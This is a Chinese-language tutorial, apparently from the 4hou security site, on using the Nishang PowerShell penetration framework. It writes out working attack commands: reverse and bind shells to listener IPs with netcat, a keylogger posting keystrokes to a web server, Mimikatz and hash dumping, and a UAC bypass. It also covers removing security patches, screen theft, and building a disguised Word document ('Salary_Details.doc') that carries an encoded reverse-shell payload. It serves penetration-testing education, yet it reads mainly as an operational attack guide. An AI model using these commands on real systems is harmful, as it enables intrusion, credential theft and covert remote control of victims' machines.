<div class="article_cen">
                <!--文章摘要-->
               
                <p></p><p style="text-align: left">开始之前，先放出个下载地址!</p>
<p style="text-align: left">下载地址:<a href="https://github.com/samratashok/nishang" target="_blank">https://github.com/samratashok/nishang</a></p>
<p style="text-align: left"><span style="font-size: 20px"><strong>1.简介</strong></span></p>
<p style="text-align: left">Nishang是一款针对PowerShell的渗透工具。说到渗透工具，那自然便是老外开发的东西。国人开发的东西，也不是不行，只不过不被认可罢了。不管是谁开发的，既然跟渗透有关系，那自然是对我们有帮助的，学习就好。来源什么的都不重要。总之，nishang也是一款不可多得的好工具。非常的好用。</p>
<p style="text-align: left"><span style="font-size: 20px"><strong>2.简单的安装与问题处理  </strong></span></p>
<p style="text-align: left">先到github上去下载nishang，可以使用git命令直接下载，如果没有装的话下载zip文件，解压之后就可以开始我们的学习之旅了。</p>
<p style="text-align: left">导入之前加一句，nishang的使用是要在PowerShell 3.0以上的环境中才可以正常使用。也就是说win7下是有点小问题的。因为win7下自带的环境是PowerShell 2.0</p>
<center><p><img src="../images/full/634f8074515ec01505b06ca82358322d99ed06e8.jpg" /></p></center>
<p style="text-align: left">如果大家不知道自己的PowerShell环境是多少的版本。可以使用Get-Host命令来查看当前的版本。建议使用windows 10测试</p>
<p style="text-align: left">既然是PowerShell框架，那自然是要导入的，然而，导入的时候还是会碰到一些比较麻烦的问题。对PowerShell比较熟悉的，看一眼就知道是什么问题，但是不知道的就一脸蒙，百度都不知道怎么百度。比如说：</p>
<p style="text-align: left">我们在导入的时候经常会碰到的问题，（不只是nishang）</p>
<center><p><img src="../images/full/277e04e1fc2baeac497ed25964d43ad0089bc155.jpg" /></p></center>
<p style="text-align: left">出现了报错，我一直都不知道怎么办的，没办法，只能用过远程文件下载来进行本地权限绕过。</p>
<p style="text-align: left">解决方法:</p>
<p style="text-align: left">PowerShell默认的执行策略是Restricted，但是Restricted是不允许运行任何脚本的。你在PowerShell执行Get-ExecutionPolicy命令来查看默认的策略组。我们需要修改策略组，在PowerShell下执行Set-ExecutionPolicy remotesigned。再次导入，就导入成功了。（警告不需要理会）</p>
<center><p><img src="../images/full/ea9a79d8764e72880bc9e7b3b63d8f32b7c2b4b2.jpg" /></p></center>
<p style="text-align: left">因为警告不相信导入成功的，可以继续执行命令来进一步验证。</p>
<center><p><img src="../images/full/2fbfa9f004b14b7b83075f4fa8017ac8d109f673.jpg" /></p></center>
<p style="text-align: left">nishang的命令都被列出来了。执行一道命令行Get-Information。可以列出本机的信息</p>
<center><p><img src="../images/full/e443883e9a23c8ea1de50fbb3f7c702223aa0e15.jpg" /></p></center>
<center><p><img src="../images/full/dbb490cdcf132bdde5be9063db7e6fc533c960c3.jpg" /></p></center>
<p style="text-align: left"><span style="font-size: 20px"><strong>3.目录结构</strong></span></p>
<center><p><img src="../images/full/f5e00bd4dd9ec57e924048f4d23310c4bc4a2f7e.jpg" /></p></center>
<p style="text-align: left">有经验的童鞋看一眼就知道这个目录是怎么玩的了，虽然英文水平不怎么滴，但是晚了这么久看到这些目录还是有一些熟悉感的</p>
<center><p><img src="../images/full/bdbfc345cb499fdabf64f26999b3022349b4c7c3.jpg" /></p></center>
<p style="text-align: left">跟大家说个事情，150分的英语卷子，我得了27分。上面这些是我用google翻译加蒙的。这都不重要。继续往后看吧。主要是他后续的功能以及命令的使用。当导入nishang.psm1的时候，所有的模块都直接可以被PowerShell读到。当然，在渗透过程中，肯定不能直接把nishang的整个目录赋值到人家的服务器上。远程下载的时候，了解目录结构对我们寻找文件位置是很有帮助的~~</p>
<p style="text-align: left"><span style="font-size: 20px"><strong>4.操作方法</strong></span></p>
<p style="text-align: left">忍不住的小伙子们，来来来，拿起纸和笔，记笔记，这是重点。</p>
<p style="text-align: left"><strong>4.1信息搜集</strong></p>
<p style="text-align: left">看上面的目录结构图，就知道哪里去找要用的东西了。挑一些好用的模块来说</p>
<p style="text-align: left">4.1.1 Check-VM    </p>
<p style="text-align: left">看名字就知道是干嘛的了，检测该主机是不是虚拟机</p>
<center><p><img src="../images/full/a64cc1a51de40c268d31f25dc885c6e8c721f337.jpg" /></p></center>
<p style="text-align: left">程序给了答复，说本机器就是一个虚拟机。</p>
<p style="text-align: left">4.1.2  Invoke-CredentialsPhish</p>
<p style="text-align: left">这个脚本怎么说，说是欺骗用户，让用户输入密码，但是我觉得吧，这就是个十足的流氓。</p>
<center><p><img src="../images/full/b471b7de81914833cf3e35d344b1deaa14268201.jpg" /></p></center>
<p style="text-align: left">为啥说是流氓了？不给正确密码就不给关，你说流氓不，反正关不掉，只能强制干掉进程。当然，如果成功了，还是很好用的</p>
<center><p><img src="../images/full/6f09f38e3a3e5582e72240875f14be069edfafa8.jpg" /></p></center>
<p style="text-align: left">这样还是可以的，哈~</p>
<p style="text-align: left">4.1.3 Copy-VSS</p>
<p style="text-align: left">Copy-VSS [文件地址]    –默认是在当前文件夹下面</p>
<p style="text-align: left">Copy-VSS [文件地址] -DestinationDir C:temp  –保存文件到指定文件下</p>
<p style="text-align: left">4.1.4 FireBuster FireListener</p>
<p style="text-align: left">内网扫描，很洋气的扫描器，本地开了监听，然后远程传送数据</p>
<pre class="brush:html;toolbar:false">FireListener -PortRange 130-150
FireBuster 192.168.12.107 130-150 -Verbose</pre>
<center><p><img src="../images/full/eabb9606a7345355844e715d7ac0cd487c8adc23.jpg" /></p></center>
<p style="text-align: left">4.1.5 Get-WLAN-Keys</p>
<p style="text-align: left">由于本机器是台式电脑，并没有无线网卡，所以不做演示。</p>
<p style="text-align: left">4.1.6 Keylogger键盘记录</p>
<p style="text-align: left">讲真，从来没有见过这么牛的键盘记录模块，这个模块有必要看一下HELP深究一下,真的牛。</p>
<pre class="brush:html;toolbar:false">Get-Help .Keylogger.ps1 -full</pre>
<center><p><img src="../images/full/57fd9b1309a277370fb11d4fceede87abe17fc90.jpg" /></p></center>
<p style="text-align: left">一条一条说：</p>
<p style="text-align: left">1：直接执行，他会显示</p>
<center><p><img src="../images/full/2eda108356d9b1257c9c7230e982d83d226b5b5a.jpg" /></p></center>
<p style="text-align: left">之后，默认在Temp目录下生成一个key.log文件</p>
<p style="text-align: left">2：就是一句话命令行</p>
<p style="text-align: left">-CheckURL去检查设置的URL页面中有没有 -MagicString后的字符串，有的话停止，没有的话继续。。</p>
<p style="text-align: left">3 : 将记录的信息以POST形式发送到WEB服务器上。</p>
<p style="text-align: left">4：电脑重启之后，继续监听。。</p>
<p style="text-align: left">当监听完成后，需要用Utility目录下的Parse_Keys来解析key文件</p>
<pre class="brush:html;toolbar:false">Parse_Keys "C:UsersxxxAppDataLocalTempkey.log" "c:test.txt"</pre>
<center><p><img src="../images/full/9d9f29f67fe8fd067b11eac412aa610f45ea77dd.jpg" /></p></center>
<p style="text-align: left">总之-MagicString这后面就是密码</p>
<p style="text-align: left">-CheckURL 也一定要写自己的，要不停不下来了</p>
<p style="text-align: left">没有设置persist的童鞋，关掉当前PowerShell，即刻停止</p>
<p style="text-align: left">4.1.7 抓取用户的明文密码</p>
<p style="text-align: left">Invoke-Mimikatz 不需要解释的神器</p>
<center><p><img src="../images/full/a078170f1c6bfd4264ad35198a94b49b291314af.jpg" /></p></center>
<p style="text-align: left">4.1.8 HASH获取</p>
<p style="text-align: left">Get-PassHashes</p>
<center><p><img src="../images/full/5a811112814774ad29fde2bd19fd7a2d213fa012.jpg" /></p></center>
<p style="text-align: left">4.1.9 获取用户的密码提示信息</p>
<pre class="brush:html;toolbar:false">Get-PassHints</pre>
<center><p><img src="../images/full/759be43b482ebfa6c7fb3fcc549e00d5247f8205.jpg" /></p></center>
<p style="text-align: left">感觉没什么用，但是别小看这个功能，有的时候可以根据提示信息来生成密码文件，大大提高爆破的成功率。还有的人会将明文密码记录在这个提示信息中。我曾经就是。。</p>
<p style="text-align: left"><strong>4.2.0各式各样的反弹</strong></p>
<p style="text-align: left">既然说是神器，那自然有牛的一面，各式各样的shell，任由你反弹，跟msf一样。</p>
<p style="text-align: left">###TCP的shell</p>
<p style="text-align: left">既然TCP，那就有正反向链接，先来反向链接（需要NC）</p>
<p style="text-align: left">反向链接：</p>
<p style="text-align: left">NC下执行 : nc -lvp 3333</p>
<p style="text-align: left">在PowerShell下执行：Invoke-PowerShellTcp -Reverse -IPAddress 192.168.12.110 -Port 3333</p>
<center><p><img src="../images/full/e80474fa0b9313843d5894c46303f9e9e2a00a6a.jpg" /></p></center>
<p style="text-align: left">正向链接:</p>
<p style="text-align: left">PowerShell下执行:Invoke-PowerShellTcp -Bind -Port 3333</p>
<p style="text-align: left">NC下执行:nc -nv 192.168.12.103 3333</p>
<center><p><img src="../images/full/6564552567c898ac287a5ade72fa50112a410c60.jpg" /></p></center>
<p style="text-align: left">###UDP 的Shell</p>
<p style="text-align: left">只是单纯的将Invoke-PowerShellTcp改为Invoke-PowerShellUdp，其他命令。之后就是nc的命令改变了</p>
<p style="text-align: left">正向连接:nc -nvu 192.168.12.103 3333</p>
<p style="text-align: left">反向连接:nc -lup 3333</p>
<p style="text-align: left">一波题外话，看不懂nc命令的童鞋：<a href="https://www.explainshell.com" target="_blank">https://www.explainshell.com</a></p>
<p style="text-align: left">可以到这里，命令可以解析，什么都可以，不止是nc，linux命令都行</p>
<center><p><img src="../images/full/d65740ce9e9cea309fe91b3b2091dc6bd10b6993.jpg" /></p></center>
<p style="text-align: left">就是都是英文，不过比较简单了</p>
<p style="text-align: left">###HTTP/HTTPS的shell</p>
<pre class="brush:html;toolbar:false">HTTP:Invoke-PoshRatHttp -IPAddress 192.168.12.103 -Port 3333
HTTPS:Invoke-PoshRatHttps -IPAddress 192.168.12.103 -Port 3333</pre>
<p>执行完之后会生成一道命令，HTTP和HTTPS一样，这里我只演示是HTTP</p>
<center><p><img src="../images/full/f43280e3e20e5bc56b75a92cfa0d3016f7322a29.jpg" /></p></center>
<p style="text-align: left">将这道命令拖入cmd中执行，之后命令行消失，在本机Powershell下返回了一个会话</p>
<center><p><img src="../images/full/2bdc2f370810e60e3d7ba85947715ac7c28c42f6.jpg" /></p></center>
<p style="text-align: left"><strong>4.3 webshell</strong></p>
<p style="text-align: left">存放于nishangAntak-WebShell目录下，就是一个ASPX的大马，但是命令行是PowerShell，比单纯的cmd强大很多。功能齐全，日aspx的站必备的东西</p>
<center><p><img src="../images/full/5b06066294caa592ce4391c99de02b778e5df050.jpg" /></p></center>
<p style="text-align: left">同样需要账号密码，上传下载，无所不能。</p>
<p style="text-align: left"><strong>4.4 提权</strong></p>
<p style="text-align: left">渗透过程中，这里应该是使用最多的地方了。</p>
<p style="text-align: left">4.4.1 尝试本地权限提升</p>
<p style="text-align: left">Enable-DuplicateToken</p>
<p style="text-align: left">这个脚本在我们具有一定权限的时候，可以帮助帮助我们获得系统权限。</p>
<p style="text-align: left">4.4.2 Bypass UAC</p>
<p style="text-align: left">Invoke-PsUACme 看名字就知道是干嘛的了。绕过UAC吗~，Nishang中给出的方法太全面了，GET-HELP来看看帮助信息</p>
<center><p><img src="../images/full/62ee673b261ab095e9779256598f6ab0e339ccfd.jpg" /></p></center>
<p style="text-align: left">实例一: 使用Sysprep方法和默认的Payload执行</p>
<p style="text-align: left">实例二: 使用oobe方法跟默认的payload执行</p>
<p style="text-align: left">实例三: 使用oobe方法跟自制payload执行</p>
<p style="text-align: left">这个模块用的是UACME项目的DLL来Bypass UAC。所以，方法对照表</p>
<center><p><img src="../images/full/0fffb82e8808e42a379ba87c81b07ef001efd55c.jpg" /></p></center>
<p style="text-align: left">这只是官方给的例子，回过头来看一眼上面的参数信息。</p>
<center><p><img src="../images/full/e3bf68187a8e4e8df1253b5ad0833f89b266cad7.jpg" /></p></center>
<p style="text-align: left">-Payloadpath指定一个payload路径</p>
<p style="text-align: left">-CustomDll64</p>
<p style="text-align: left">指定一个dll文件，后两位代表系统位数</p>
<p style="text-align: left">-CustomDll32</p>
<p style="text-align: left">尝试本地Bypass UAC:</p>
<center><p><img src="../images/full/f1037b92398d1d8c4b9d25ce608524dbaf15865a.jpg" /></p></center>
<p style="text-align: left">4.4.3 删除补丁</p>
<p style="text-align: left">删除补丁，这是我见过最`厉害`的脚本，没有之一。如此骚气！</p>
<p style="text-align: left">Remove-Update</p>
<center><p><img src="../images/full/4f15cfeca5bffbc86f70307775862a40c8c066dc.jpg" /></p></center>
<p style="text-align: left">实例一: 删除全部补丁</p>
<p style="text-align: left">实例二: 删除全部的安全补丁</p>
<p style="text-align: left">实例三: 删除指定的补丁</p>
<p style="text-align: left">这是删除之前的补丁情况</p>
<center><p><img src="../images/full/56a4739025e43775cfce6bcb0d823852bf3bf552.jpg" /></p></center>
<p style="text-align: left"> </p>
<p style="text-align: left">尝试删除第一个补丁</p>
<center><p><img src="../images/full/e37c7232a66de94820e1c5598f97a5785b636d6a.jpg" /></p></center>
<p style="text-align: left">成功删除了第一个补丁。</p>
<p style="text-align: left"><strong>4.5端口扫描，爆破</strong></p>
<p style="text-align: left">4.5.1： 端口扫描</p>
<p style="text-align: left">来详细说明下个个参数</p>
<p style="text-align: left">可以使用 Get-Help Invoke-PortScan -full 查看帮助信息</p>
<center><p><img src="../images/full/c1151073b5c0f2cbd468c1bbafeaee6bcf72107b.jpg" /></p></center>
<p style="text-align: left">-StartAddress 开始的IP地址</p>
<p style="text-align: left">-EndAddress 结束的IP地址</p>
<p style="text-align: left">-ResolveHost 是否解析主机名</p>
<p style="text-align: left">-ScanPort要不要进行端口扫描</p>
<p style="text-align: left">-Port 要扫描的端口（默认很多，看上图）</p>
<p style="text-align: left">-TimeOut 超时时间</p>
<p style="text-align: left">对我本地局域网进行扫描:</p>
<p style="text-align: left">Invoke-PortScan -StartAddress 192.168.250.1 -EndAddress 192.168.250.255 -ResolveHost</p>
<p style="text-align: left">扫描中:</p>
<center><p><img src="../images/full/236c0a627dd1f0cb8ee5c838c4f2c7185fbec506.jpg" /></p></center>
<p style="text-align: left">扫描结束:</p>
<center><p><img src="../images/full/bc65e930082199d02d0c07a876a1d9cfa59cc633.jpg" /></p></center>
<p style="text-align: left">4.5.2 弱口令爆破</p>
<p style="text-align: left">Invoke-BruteForce</p>
<p style="text-align: left">之前先说命令参数</p>
<p style="text-align: left">-ComputerName 对应服务的计算机名</p>
<p style="text-align: left">-UserList 用户名字典</p>
<p style="text-align: left">-PasswordList 密码字典</p>
<p style="text-align: left">-Service 服务（默认为：SQL）</p>
<p style="text-align: left">-StopOnSuccess 匹配一个后停止</p>
<p style="text-align: left">-Delay 延迟时间</p>
<center><p><img src="../images/full/757b0d2aa2d0bba88a9d99f13bfba8f9789dc9dc.jpg" /></p></center>
<p style="text-align: left">有了上面的说明，这里看到应该很清楚了。不在做过多的解释。</p>
<p style="text-align: left"><strong>4.6 嗅探</strong></p>
<p style="text-align: left">内网嗅探，动静太大了，但是，实在没办法的时候，不得不说，这是一个办法。</p>
<p style="text-align: left">在靶机上执行:Invoke-Interceptor -ProxyServer 192.168.250.172 -ProxyPort 9999</p>
<p style="text-align: left">监听机器上执行:netcat -lvvp 9999</p>
<center><p><img src="../images/full/cc03e238ee4110e4a3d9546294299b6707874b55.jpg" /></p></center>
<center><p><img src="../images/full/ea604e45c343e5c509cc6e180233ea2ed82c2ce6.jpg" /></p></center>
<p style="text-align: left"><strong> 4.7 屏幕窃取</strong></p>
<p style="text-align: left">Show-TargetScreen</p>
<p style="text-align: left">屏幕窃取，一样正反向通吃</p>
<p style="text-align: left">-IPAddress  后面加IP地址（反向链接需要）</p>
<p style="text-align: left">-Port 加端口</p>
<p style="text-align: left">-Bind 正向连接</p>
<p style="text-align: left">反向链接窃取屏幕</p>
<p style="text-align: left">靶机:Show-TargetScreen -Reverse -IPAddress 192.168.250.172 -Port 3333</p>
<p style="text-align: left">攻击机:netcat -nlvp 3333 | netcat -nlvp 9999</p>
<p style="text-align: left">之后访问攻击机器的9999端口，就可以窃取到屏幕了</p>
<center><p><img src="../images/full/f25f0bbc62595c888af531dd9644bfe1e65a5f5d.jpg" /></p></center>
<p style="text-align: left">正向连接窃取屏幕</p>
<p style="text-align: left">靶机执行:Show-TargetScreen -Bind -Port 3333</p>
<p style="text-align: left">攻击机执行:netcat -nv 192.168.250.37 3333 | netcat -lnvp 9999</p>
<p style="text-align: left">之后同样，访问本机的9999端口，就能正常访问了。</p>
<p style="text-align: left"><strong>4.8 Client</strong></p>
<p style="text-align: left">Nishang可以生成各式各样的客户端。类型大概有</p>
<center><p><img src="../images/full/028058c86d9a216e3498cb53f39eabf18d38edff.jpg" /></p></center>
<p style="text-align: left">这么多类型全都可以生成。选择一种来说，其他的方法都是类似的。</p>
<p style="text-align: left">打开nishangShellsInvoke-PowerShellTcpOneLine.ps1这个文件，复制第三行的内容。可以看到中间有一个TCPClient的参数，这里就是远程连接的地址了</p>
<center><p><img src="../images/full/19812875da0eab7e105469ca18632dd2b3a29887.jpg" /></p></center>
<p style="text-align: left">更改这个地址和端口即可，之后进入命令行执行</p>
<p style="text-align: left">Invoke-Encode -DataToEncode '你的代码' -IsString -PostScript</p>
<center><p><img src="../images/full/1c8b93f94fcb55ac8e5d676cc24e4aa03fc543ad.jpg" /></p></center>
<p style="text-align: left">执行完成之后会在当前目录下生成两个文件。一个是encoded.txt 另一个是encodedcommand.txt。之后执行</p>
<p style="text-align: left"> Out-Word -PayloadScript .encodedcommand.txt</p>
<p style="text-align: left">就可以在我们当前文件夹下生成一个名为Salary_Details.doc的doc文件。之后使用nc监听就好</p>
<p style="text-align: left">说完了操作，回过头来看看命令行参数</p>
<p style="text-align: left"> -Payload  后面直接加payload，但是注意引号的闭合</p>
<p style="text-align: left"> -PayloadURL  传入远程的payload进行生成</p>
<p style="text-align: left">-PayloadScript  指定本地的脚本进行生成</p>
<p style="text-align: left">-Arguments  之后加要执行的函数。（payload之中有的函数）</p>
<p style="text-align: left">-OutputFile   输出的文件名</p>
<p style="text-align: left">-WordFileDir  输出的目录地址</p>
<p style="text-align: left">-Recurse   在WordFileDir中递归寻找Word文件</p>
<p style="text-align: left">-RemoveDocx 创建完成后删除掉原始的文件</p>
<p style="text-align: left"><span style="font-size: 20px"><strong>5.总结</strong></span></p>
<p style="text-align: left">看完之后肯定一脸懵逼，这都是啥。这么复杂的语法，没办法，针对PowerShell的工具语法相对而言都比较复杂。而且，并没有讲解nishang的后门模块，个人觉得不是那么好用。还有一些反弹技巧并没有详细介绍，比如说什么DNS反弹，ICMP反弹，WMI反弹。</p>
<p style="text-align: left">有兴趣的朋友可以自行研究，每一款工具针对不同的环境都能给我们带来意想不到的效果。不用归不用,但是到万不得已用的时候，才是最恶心的，艺多不压身嘛~</p>
<p style="text-align: left">在研究过程中又碰到问题的，点我头像给我留言，我看到的话会尽量帮忙的~</p>
                <div class="foot_description" style="background-color: #fff;">
                    本文为 smileTT 原创稿件，授权嘶吼独家发布，未经许可禁止转载，如若转载，请联系嘶吼编辑：                        <a href="http://www.4hou.com/technology/5962.html" target="_blank">http://www.4hou.com/technology/5962.html</a>
                                    </div>


                 
            </div>
